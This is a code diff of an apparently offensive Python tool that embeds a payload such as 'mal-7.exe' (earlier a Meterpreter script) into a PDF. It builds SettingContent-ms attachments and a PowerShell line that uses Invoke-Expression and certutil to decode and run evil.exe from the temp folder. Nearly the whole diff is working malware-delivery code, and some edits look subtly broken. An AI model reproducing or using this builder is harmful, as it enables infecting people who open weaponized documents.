@@ -6,7 +6,7 @@ import base64
 
 from PyPDF2 import PdfFileWriter, PdfFileReader
 
-payload = "meterpreter-64-take-6.ps1"
+payload = "mal-7.exe"
 output = "new.pdf"
 inp = "sample.pdf"
 
@@ -50,16 +50,17 @@ def isBase64(payload, filename):
             isb64 = False
     else:
         isb64 = False
-    print(str(payload))
-    #base64.b64decode(payload)
-    #print(str(payload))
+    # print(str(payload))
+    # base64.b64decode(payload)
+    # print(str(payload))
     return isb64
     
 # Create payload file to embed
 def create_putfile(payload, b64):
     print("before putfile")
-    putfile = payload.split("\n")
+    putfile = payload.split(b'\n')
     print("after putfile")
+    
     if b64:
         payload = payload.decode()
         payload = payload.split('\n')
@@ -71,14 +72,15 @@ def create_putfile(payload, b64):
         payload = payload.decode()
         payload = payload.split('\n')
         payload = "".join(payload)
-        
+        # print(payload)
         putfile[6] = "Write-Output \"" + payload + "\" > $env:TEMP\\evil.b64 \n"
-    
-    return "\n".join(putfile)
+        # print(putfile)
+    return "\n".join(str(putfile))
     
 # Create powershell script to embed in file and execute payload
-def create_powershell():
-    psFile = scm.split("\n")
+def create_powershell(putFile):
+    psFile = putFile.split("\n")
+    print(psFile)
     psFile[5] = "';$Store = $Store -replace([regex]::Escape($fpath + ':7:'), '');$Store = $Store -replace('', '');Invoke-Expression $Store; certutil -decode $env:TEMP\evil.b64 $env:TEMP\evil.exe; Invoke-Expression ($env:TEMP + '\evil.exe')]]>"
     
     return "\n".join(psFile)
@@ -90,14 +92,14 @@ def insertMaliciousFiles():
     # Read contents of payload file
     with open(payload, "rb") as pd:
         raw_payload = pd.read()
-    print(raw_payload)
-    #payload.close()
+    # print(raw_payload)
+    # payload.close()
     # Check if payload is base64 encoded
     var = isBase64(raw_payload, payload)
-    print(str(var))
+    # print(str(var))
     # Create malicious files
     putFile = create_putfile(raw_payload, var)
-    psFile = create_powershell()
+    psFile = create_powershell(putFile)
     files = [putFile, psFile]
     fileNames = ["Payload.SettingContent-ms", "psFile.SettingContent-ms"]
     # Create the files, write to them and then attach them using pdftk
